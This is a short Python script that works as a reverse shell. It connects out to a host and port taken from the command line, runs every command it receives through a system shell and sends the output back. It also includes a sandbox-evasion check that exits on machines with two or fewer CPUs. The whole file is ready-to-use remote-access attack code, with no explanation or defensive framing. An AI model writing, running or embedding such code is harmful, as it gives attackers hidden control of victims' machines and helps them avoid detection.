import os
import socket
import subprocess
import argparse

# Argument parser for host and port
parser = argparse.ArgumentParser(description='Connect to a remote host and port.')
parser.add_argument('host', type=str, help='The remote host to connect to')
parser.add_argument('port', type=int, help='The remote port to connect to')
args = parser.parse_args()

HOST = args.host
PORT = args.port

if os.cpu_count() <= 2:
    quit()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.send(str.encode("[*] Connection Established!"))

while True:
    try:
        s.send(str.encode(os.getcwd() + "> "))
        data = s.recv(1024).decode("UTF-8")
        data = data.strip('\n')
        if data == "quit":
            break
        if data[:2] == "cd":
            os.chdir(data[3:])
        if len(data) > 0:
            proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            stdout_value = proc.stdout.read() + proc.stderr.read()
            output_str = str(stdout_value, "UTF-8")
            s.send(str.encode("\n" + output_str))
    except Exception as e:
        continue

s.close()
